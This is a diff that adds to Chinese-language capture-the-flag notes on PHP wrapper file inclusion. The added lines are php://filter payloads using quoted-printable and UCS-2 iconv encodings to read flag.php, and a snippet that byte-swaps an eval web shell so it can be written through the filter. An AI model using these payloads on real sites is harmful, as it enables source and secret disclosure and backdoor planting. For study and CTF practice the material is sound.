@@ -19,6 +19,20 @@ include php://filter/read=convert.base64-encode/resource=flag.php
 也可中间加个index等字符也可以。
 php://filter/read=convert.base64-encode/index/resource=flag
 ```
+其他编码方式
+```
+
+
+file=php://filter/read=convert.quoted-printable-encode/resource=/var/www/html/flag.php
+
+file=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=hack.php
+
+<?php
+$re = iconv("UCS-2LE","UCS-2BE", '<?php @eval($_GET[1]);?>');
+echo $re;
+?>
+得?<hp pe@av(l_$EG[T]1;)>?
+```
 
 ^
 ## **php伪协议 文件包含注入php的php代码**
